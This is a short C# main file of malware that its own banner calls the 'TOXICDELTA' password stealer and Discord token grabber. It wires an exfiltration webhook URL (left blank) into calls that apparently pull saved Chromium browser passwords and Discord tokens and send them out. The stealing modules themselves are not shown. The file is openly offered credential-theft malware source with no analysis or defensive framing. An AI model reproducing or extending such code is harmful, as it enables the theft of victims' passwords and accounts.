using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ToxicDelta.Chromium;
#pragma warning disable CS1998 // PLEASE STFU

namespace ToxicDelta
{
    public class Program
    {
        public static async Task Main()
        {
            /*
             * ΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔ
             * TOXICDELTA                           Δ
             * PASSWORD STEALER/DISCORD TOKEN GRABBER
             * ΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔΔ
            */

            var webhookUrl = "";
            ChromiumPasswords.MainPSWR(webhookUrl);
            await TknGrabber.DiscordToken.DiscordTkn(webhookUrl);
        }
    }
}
